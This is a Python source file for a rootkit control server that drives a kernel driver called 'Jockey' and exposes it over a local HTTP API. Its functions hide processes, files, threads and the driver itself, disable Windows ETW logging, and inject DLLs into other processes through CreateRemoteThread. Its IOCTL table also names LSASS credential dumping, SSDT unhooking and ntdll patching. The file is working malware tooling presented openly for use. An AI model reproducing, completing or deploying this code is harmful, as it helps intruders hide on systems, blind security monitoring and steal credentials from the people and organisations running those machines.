"""
Jockey Windows Agent Server
- Talks to the jockey kernel driver via \\.\Jockey
- Manages stealth modules (DLLs / payloads)
- Exposes a local HTTP API for control
- Handles process injection, file hiding, PID hiding, ETW disable, etc.
"""
import os
import sys
import ctypes
import struct
import uuid
import time
import hashlib
import threading
import logging
import tempfile
import shutil
from ctypes import wintypes
from datetime import datetime
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json

# ---------------------------------------------------------------------------
# kernel driver interface
# ---------------------------------------------------------------------------

class JockeyDriver:
    """Thin wrapper around \\.\Jockey DeviceIoControl calls."""

    IOCTL_BASE = 0x80002000
    JKY_MAGIC  = 0x004A4B59

    IOCTLS = {
        "PING":            0x80002000,
        "HIDE_PID":        0x80002004,
        "UNHIDE_PID":      0x80002008,
        "HIDE_FILE":       0x8000200C,
        "UNHIDE_FILE":     0x80002010,
        "GET_ROOT":        0x80002014,
        "KILL_PID":        0x80002018,
        "DISABLE_ETW":     0x8000201C,
        "DISABLE_OB_CB":   0x80002020,
        "HIDE_DRIVER":     0x80002024,
        "PROTECT_MEM":     0x80002028,
        "DISABLE_CB":      0x8000202C,
        "HIDE_THREAD":     0x80002030,
        "SPOOF_PPID":      0x80002034,
        "CLEAR_ETW":       0x80002038,
        "DUMP_LSASS":      0x8000203C,
        "HIDE_PORT":       0x80002040,
        "PROCESS_SHIELD":  0x80002044,
        "UNHOOK_SSDT":     0x80002048,
        "PATCH_NTDLL":     0x8000204C,
    }

    def __init__(self):
        self._lock = threading.Lock()
        self._open()

    def _open(self):
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        self._CreateFileW = kernel32.CreateFileW
        self._CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                                       wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD,
                                       wintypes.HANDLE]
        self._CreateFileW.restype = wintypes.HANDLE
        self._DeviceIoControl = kernel32.DeviceIoControl
        self._DeviceIoControl.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID,
                                          wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD,
                                          ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
        self._DeviceIoControl.restype = wintypes.BOOL
        self._CloseHandle = kernel32.CloseHandle
        self._CloseHandle.argtypes = [wintypes.HANDLE]

        h = self._CreateFileW(r"\\.\Jockey", 0xC0000000, 0, None, 3, 0, None)
        if h == 0xFFFFFFFFFFFFFFFF:
            raise RuntimeError(f"Cannot open \\\\.\\Jockey (err {ctypes.get_last_error()})")
        self._handle = h

    def _ioctl(self, code: int, in_buf: bytes, out_len: int = 256) -> tuple[bool, int, bytes]:
        with self._lock:
            out = ctypes.create_string_buffer(out_len)
            ret = wintypes.DWORD(0)
            ok = self._DeviceIoControl(self._handle, code,
                                       ctypes.c_char_p(in_buf), len(in_buf),
                                       out, out_len, ctypes.byref(ret), None)
            return ok, ret.value, bytes(out.raw[:ret.value])

    def ping(self) -> bool:
        buf = struct.pack("<I", self.JKY_MAGIC)
        ok, _, _ = self._ioctl(self.IOCTLS["PING"], buf, 4)
        return ok

    def hide_pid(self, pid: int) -> bool:
        buf = struct.pack("<II", pid, 0)
        ok, _, _ = self._ioctl(self.IOCTLS["HIDE_PID"], buf, 4)
        return ok

    def unhide_pid(self, pid: int) -> bool:
        buf = struct.pack("<II", pid, 0)
        ok, _, _ = self._ioctl(self.IOCTLS["UNHIDE_PID"], buf, 4)
        return ok

    def hide_file(self, path: str) -> bool:
        encoded = path.encode("utf-16-le") + b"\x00\x00"
        buf = bytearray(260 * 2 + 4)
        buf[:4] = struct.pack("<I", self.JKY_MAGIC)
        buf[4:4+len(encoded)] = encoded
        ok, _, _ = self._ioctl(self.IOCTLS["HIDE_FILE"], bytes(buf), 4)
        return ok

    def unhide_file(self, path: str) -> bool:
        encoded = path.encode("utf-16-le") + b"\x00\x00"
        buf = bytearray(260 * 2 + 4)
        buf[:4] = struct.pack("<I", self.JKY_MAGIC)
        buf[4:4+len(encoded)] = encoded
        ok, _, _ = self._ioctl(self.IOCTLS["UNHIDE_FILE"], bytes(buf), 4)
        return ok

    def disable_etw(self) -> bool:
        buf = struct.pack("<I", self.JKY_MAGIC)
        ok, _, _ = self._ioctl(self.IOCTLS["DISABLE_ETW"], buf, 4)
        return ok

    def hide_driver(self) -> bool:
        buf = struct.pack("<I", self.JKY_MAGIC)
        ok, _, _ = self._ioctl(self.IOCTLS["HIDE_DRIVER"], buf, 4)
        return ok

    def hide_thread(self, tid: int) -> bool:
        buf = struct.pack("<II", tid, 0)
        ok, _, _ = self._ioctl(self.IOCTLS["HIDE_THREAD"], buf, 4)
        return ok

    def kill_pid(self, pid: int) -> bool:
        buf = struct.pack("<II", pid, 0)
        ok, _, _ = self._ioctl(self.IOCTLS["KILL_PID"], buf, 4)
        return ok

    def get_root(self) -> tuple[bool, int]:
        buf = struct.pack("<I", self.JKY_MAGIC)
        ok, ret, _ = self._ioctl(self.IOCTLS["GET_ROOT"], buf, 4)
        return ok, ret

    def close(self):
        try:
            self._CloseHandle(self._handle)
        except Exception:
            pass

# ---------------------------------------------------------------------------
# module manager
# ---------------------------------------------------------------------------

class Module:
    """A deployable stealth module (DLL or shellcode blob)."""
    def __init__(self, mid: str, name: str, path: str, module_type: str = "dll"):
        self.id = mid
        self.name = name
        self.path = path
        self.type = module_type
        self.sha256 = self._hash()
        self.added = int(time.time())
        self.size = os.path.getsize(path) if os.path.isfile(path) else 0

    def _hash(self) -> str:
        h = hashlib.sha256()
        with open(self.path, "rb") as f:
            while True:
                chunk = f.read(65536)
                if not chunk:
                    break
                h.update(chunk)
        return h.hexdigest()[:16]

    def to_dict(self) -> dict:
        return {
            "id": self.id, "name": self.name, "type": self.type,
            "path": self.path, "sha256": self.sha256,
            "size": self.size, "added": self.added,
        }


class ModuleManager:
    """Load / unload / list modules on the Windows host."""

    def __init__(self, modules_dir: str | None = None):
        root = Path(modules_dir or os.path.join(os.environ.get("TEMP", "."), "jockey_modules"))
        root.mkdir(parents=True, exist_ok=True)
        self.dir = root
        self._modules: dict[str, Module] = {}
        self._lock = threading.Lock()
        self._load_index()

    def _index_path(self) -> str:
        return os.path.join(self.dir, "modules.json")

    def _load_index(self):
        p = self._index_path()
        if not os.path.isfile(p):
            return
        try:
            with open(p) as f:
                data = json.load(f)
            for m in data:
                if os.path.isfile(m.get("path", "")):
                    mod = Module(m["id"], m["name"], m["path"], m.get("type", "dll"))
                    mod.sha256 = m.get("sha256", mod.sha256)
                    mod.added = m.get("added", mod.added)
                    self._modules[mod.id] = mod
        except Exception:
            pass

    def _save_index(self):
        with self._lock:
            with open(self._index_path(), "w") as f:
                json.dump([m.to_dict() for m in self._modules.values()], f, indent=2)

    def add(self, name: str, src_path: str, module_type: str = "dll") -> Module:
        mid = uuid.uuid4().hex[:12]
        dest = os.path.join(self.dir, f"{mid}_{name}")
        shutil.copy2(src_path, dest)
        mod = Module(mid, name, dest, module_type)
        with self._lock:
            self._modules[mid] = mod
        self._save_index()
        return mod

    def remove(self, mid: str) -> bool:
        with self._lock:
            mod = self._modules.pop(mid, None)
        if not mod:
            return False
        try:
            os.remove(mod.path)
        except OSError:
            pass
        self._save_index()
        return True

    def get(self, mid: str) -> Module | None:
        return self._modules.get(mid)

    def list_all(self) -> list[dict]:
        with self._lock:
            return [m.to_dict() for m in self._modules.values()]

# ---------------------------------------------------------------------------
# injection helpers
# ---------------------------------------------------------------------------

class Injector:
    """User-mode process injection via CreateRemoteThread + LoadLibrary."""

    PROC_ACCESS = 0x001F0FFF  # PROCESS_ALL_ACCESS

    def inject_dll(self, pid: int, dll_path: str) -> tuple[bool, str]:
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        OpenProcess = kernel32.OpenProcess
        OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        OpenProcess.restype = wintypes.HANDLE
        VirtualAllocEx = kernel32.VirtualAllocEx
        VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t,
                                   wintypes.DWORD, wintypes.DWORD]
        VirtualAllocEx.restype = wintypes.LPVOID
        WriteProcessMemory = kernel32.WriteProcessMemory
        WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID,
                                       ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
        WriteProcessMemory.restype = wintypes.BOOL
        CreateRemoteThread = kernel32.CreateRemoteThread
        CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t,
                                       wintypes.LPVOID, wintypes.LPVOID,
                                       wintypes.DWORD, wintypes.LPDWORD]
        CreateRemoteThread.restype = wintypes.HANDLE
        CloseHandle = kernel32.CloseHandle
        CloseHandle.argtypes = [wintypes.HANDLE]

        h_proc = OpenProcess(self.PROC_ACCESS, False, pid)
        if not h_proc:
            return False, f"OpenProcess failed (err {ctypes.get_last_error()})"

        addr = VirtualAllocEx(h_proc, None, len(dll_path) + 1,
                              0x3000, 0x40)  # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
        if not addr:
            CloseHandle(h_proc)
            return False, f"VirtualAllocEx failed (err {ctypes.get_last_error()})"

        written = ctypes.c_size_t(0)
        ok = WriteProcessMemory(h_proc, addr, dll_path.encode("utf-16-le") + b"\x00\x00",
                                len(dll_path) * 2 + 2, ctypes.byref(written))
        if not ok:
            CloseHandle(h_proc)
            return False, f"WriteProcessMemory failed (err {ctypes.get_last_error()})"

        h_thread = CreateRemoteThread(h_proc, None, 0,
                                       ctypes.cast(ctypes.c_void_p(
                                           kernel32.GetProcAddress(
                                               kernel32.GetModuleHandleW("kernel32"),
                                               b"LoadLibraryW"
                                           )), wintypes.LPVOID),
                                       addr, 0, None)
        if not h_thread:
            CloseHandle(h_proc)
            return False, f"CreateRemoteThread failed (err {ctypes.get_last_error()})"

        CloseHandle(h_thread)
        CloseHandle(h_proc)
        return True, "injected"

# ---------------------------------------------------------------------------
# HTTP API
# ---------------------------------------------------------------------------

AUTH_TOKEN = os.environ.get("WIN_SRV_TOKEN", uuid.uuid4().hex[:24])
logging.basicConfig(level=logging.INFO, format="%(asctime)s [win-srv] %(message)s")
log = logging.getLogger("win-srv")

class ApiHandler(BaseHTTPRequestHandler):
    server_version = "JockeyWS/1.0"

    def _send(self, data, code=200, ctype="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(data if isinstance(data, bytes) else data.encode())

    def _auth(self) -> bool:
        return self.headers.get("Authorization") == f"Bearer {AUTH_TOKEN}"

    def log_message(self, fmt, *args):
        log.info(fmt % args)

    # ---- root ----
    def do_GET(self):
        if not self._auth():
            return self._send(json.dumps({"error": "unauthorized"}), 401)
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/")

        if path == "/":
            return self._send(json.dumps({"status": "running", "endpoints": [
                "/api/status", "/api/driver/ping",
                "/api/driver/hide_pid/<pid>", "/api/driver/unhide_pid/<pid>",
                "/api/driver/hide_file", "/api/driver/unhide_file",
                "/api/driver/etw", "/api/driver/driver_hide",
                "/api/driver/thread/<tid>", "/api/driver/kill/<pid>",
                "/api/modules", "/api/modules/add", "/api/modules/<mid>",
                "/api/inject/<pid>",
            ]}))

        elif path == "/api/status":
            return self._send(json.dumps({
                "ts": int(time.time()),
                "driver_loaded": srv.driver is not None and srv.driver.ping(),
                "modules": len(srv.modules.list_all()),
                "auth_token": AUTH_TOKEN[:8] + "...",
            }))

        elif path == "/api/driver/ping":
            ok = srv.driver.ping() if srv.driver else False
            return self._send(json.dumps({"ping": ok}))

        elif path.startswith("/api/driver/hide_pid/"):
            pid = int(path.split("/")[-1])
            return self._send(json.dumps({"ok": srv.driver.hide_pid(pid)}))
        elif path.startswith("/api/driver/unhide_pid/"):
            pid = int(path.split("/")[-1])
            return self._send(json.dumps({"ok": srv.driver.unhide_pid(pid)}))

        elif path.startswith("/api/driver/thread/"):
            tid = int(path.split("/")[-1])
            return self._send(json.dumps({"ok": srv.driver.hide_thread(tid)}))

        elif path.startswith("/api/driver/kill/"):
            pid = int(path.split("/")[-1])
            return self._send(json.dumps({"ok": srv.driver.kill_pid(pid)}))

        elif path == "/api/driver/etw":
            return self._send(json.dumps({"ok": srv.driver.disable_etw()}))
        elif path == "/api/driver/driver_hide":
            return self._send(json.dumps({"ok": srv.driver.hide_driver()}))

        elif path == "/api/modules":
            return self._send(json.dumps(srv.modules.list_all()))

        else:
            return self._send(json.dumps({"error": "not found"}), 404)

    def do_POST(self):
        if not self._auth():
            return self._send(json.dumps({"error": "unauthorized"}), 401)
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length) or "{}")
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/")

        if path == "/api/driver/hide_file":
            fp = body.get("path", "")
            return self._send(json.dumps({"ok": srv.driver.hide_file(fp)}))
        if path == "/api/driver/unhide_file":
            fp = body.get("path", "")
            return self._send(json.dumps({"ok": srv.driver.unhide_file(fp)}))

        elif path == "/api/modules/add":
            src = body.get("path", "")
            name = body.get("name", os.path.basename(src))
            mtype = body.get("type", "dll")
            try:
                mod = srv.modules.add(name, src, mtype)
                return self._send(json.dumps({"ok": True, "module": mod.to_dict()}))
            except Exception as e:
                return self._send(json.dumps({"error": str(e)}), 400)

        elif path.startswith("/api/modules/"):
            mid = path.split("/")[-1]
            if self.command == b"DELETE":
                return self._send(json.dumps({"ok": srv.modules.remove(mid)}))

        elif path.startswith("/api/inject/"):
            pid = int(path.split("/")[-1])
            mid = body.get("module_id", "")
            mod = srv.modules.get(mid)
            if not mod:
                return self._send(json.dumps({"error": "module not found"}), 404)
            ok, msg = srv.injector.inject_dll(pid, mod.path)
            return self._send(json.dumps({"ok": ok, "detail": msg}))

        return self._send(json.dumps({"error": "not found"}), 404)

    def do_DELETE(self):
        return self.do_POST()


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

class WinServer:
    def __init__(self, host: str = "127.0.0.1", port: int = 9090):
        self.host = host
        self.port = port
        self.driver = None
        self.modules = ModuleManager()
        self.injector = Injector()
        self._httpd = None

    def start(self):
        try:
            self.driver = JockeyDriver()
            log.info("Driver opened")
        except RuntimeError as e:
            log.warning("Driver not available: %s", e)

        self._httpd = HTTPServer((self.host, self.port), ApiHandler)
        log.info("Listening on http://%s:%d", self.host, self.port)
        log.info("Auth: Bearer %s", AUTH_TOKEN)
        try:
            self._httpd.serve_forever()
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    def stop(self):
        if self._httpd:
            self._httpd.shutdown()
        if self.driver:
            self.driver.close()
        log.info("Stopped")


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=9090)
    args = p.parse_args()
    global srv
    srv = WinServer(args.host, args.port)
    srv.start()
